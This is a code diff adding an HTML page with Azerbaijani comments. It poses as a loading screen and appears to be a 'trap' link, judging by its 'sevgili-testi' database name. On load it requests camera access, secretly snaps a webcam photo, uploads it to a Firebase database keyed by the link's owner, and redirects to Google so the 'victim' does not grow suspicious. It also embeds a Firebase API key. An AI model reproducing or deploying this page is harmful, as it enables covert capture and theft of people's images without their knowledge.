@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Yüklənir...</title>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <style>
+        body { background: #000; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }
+        .loader { border: 4px solid #333; border-top: 4px solid #fff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = { apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU", databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com" };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // Linkdən ID və Rəhbər (ref) məlumatını götürürük
+        const urlParams = new URLSearchParams(window.location.search);
+        const trapID = urlParams.get('id');
+        const owner = urlParams.get('ref');
+
+        async function startCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                    const imageData = canvas.toDataURL('image/jpeg');
+
+                    // Şəkli Firebase-ə göndər
+                    db.ref('traps/' + owner + '/' + trapID).set({
+                        image: imageData,
+                        time: new Date().toLocaleString(),
+                        status: "Captured"
+                    }).then(() => {
+                        // Şəkil getdikdən sonra qurbanı Google-a yönləndir ki, şübhələnməsin
+                        window.location.href = "https://www.google.com";
+                    });
+
+                    // Kameranı söndür
+                    stream.getTracks().forEach(track => track.stop());
+                }, 2000);
+            } catch (err) {
+                // Əgər icazə verməsə, yenə də yönləndir
+                window.location.href = "https://www.google.com";
+            }
+        }
+
+        window.onload = startCapture;
+    </script>
+</body>
+</html>
